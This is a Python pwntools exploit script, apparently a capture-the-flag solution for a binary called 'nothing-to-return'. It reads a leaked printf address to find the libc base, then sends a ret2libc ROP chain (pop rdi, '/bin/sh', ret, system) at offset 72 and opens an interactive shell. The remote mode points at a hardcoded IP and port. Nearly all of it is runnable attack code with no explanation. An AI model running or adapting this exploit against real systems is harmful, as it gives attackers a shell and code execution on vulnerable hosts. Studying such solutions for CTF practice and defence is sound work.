#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './nothing-to-return'
elf = context.binary = ELF(exe, checksec=True)
libc = 'libc.so.6'
ld = 'ld-linux-x86-64.so.2'
libc = ELF(libc, checksec=True)
context.log_level = 'debug'
host, port = '34.30.126.104', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+108
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    
    # gather info
    ret = 0x40101a
    io.recvuntil(b'at ')
    printf_addr = io.recvuntil(b'\n').strip()
    printf_addr = int(printf_addr, 16)

    libc.address = printf_addr - libc.sym['printf']

    # setting fgets input size
    io.sendlineafter(b':', b'500')

    # setting up the payload
    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh'))

    pop_rdi = 0x28265 + libc.address

    # summarizing
    log.success("Print addr: %#x", printf_addr)
    log.success("Libc base addr: %#x", libc.address)
    log.success("System addr: %#x", system)
    log.success("/bin/sh addr: %#x", binsh)
    log.success("pop rdi addr: %#x", pop_rdi)

    # sending payload
    offset = 72
    payload = flat({
        offset: [
            pop_rdi,
            binsh,
            ret,
            system
        ]
    })

    io.sendlineafter(b':', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()